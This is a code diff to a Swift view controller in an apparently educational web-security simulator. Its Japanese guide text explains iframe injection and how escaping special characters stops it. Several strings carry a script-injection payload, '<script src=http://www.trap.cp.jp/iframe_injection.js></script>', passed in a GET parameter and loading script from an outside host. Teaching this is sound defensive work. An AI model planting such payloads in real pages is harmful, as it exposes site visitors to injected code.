@@ -39,11 +39,11 @@ class IFrameInjectionSafeWebSimulatorViewController: WebSimulatorViewController 
         appendGuideSection([
             GuideText(text: "この赤枠で囲まれたリンクに攻撃を行うコードが仕掛けられています。\nリンクの下に表示されたコードを見てみましょう。"),
             GuideText(
-                text: "リンク先に遷移する際、GETリクエストのnameパラメータには「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が設定されています。",
-                programingLanguages: [.html]
+                text: "リンク先に遷移する際、GETリクエストのnameパラメータには次の値が設定されます。"
             ),
+            GuideText(text: "<script src=http://www.trap.cp.jp/iframe_injection.js></script>", programingLanguages: [.html]),
             GuideText(
-                text: "このnameの値をエスケープせずに直接表示すると、「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」はHTML要素として解釈されてしまいます。",
+                text: "この値をエスケープせずに直接表示すると、「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」はHTML要素として解釈されてしまいます。",
                 programingLanguages: [.html]
             ),
             GuideText(
@@ -86,9 +86,9 @@ class IFrameInjectionSafeWebSimulatorViewController: WebSimulatorViewController 
                 programingLanguages: [.html]
             ),
             GuideText(
-                text: "今回はGETリクエストのnameの値に「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が渡されましたが、特殊文字のエスケープを行なっているので渡された値がそのまま文字列として表示されています。",
-                programingLanguages: [.html]
+                text: "今回はGETリクエストのnameパラメータに次の値が設定されていました。"
             ),
+            GuideText(text: "<script src=http://www.trap.cp.jp/iframe_injection.js></script>\nしかし、特殊文字のエスケープを行なっているので渡された値がそのまま文字列として表示されています。", programingLanguages: [.html]),
             GuideText(
                 text: "実際に実行されたのは以下のコードです。\n<p>&lt;script src=\"http://www.trap.cp.jp/iframe_injection.js\"&gt;&lt;/script&gt;さん</p>",
                 programingLanguages: [.html]
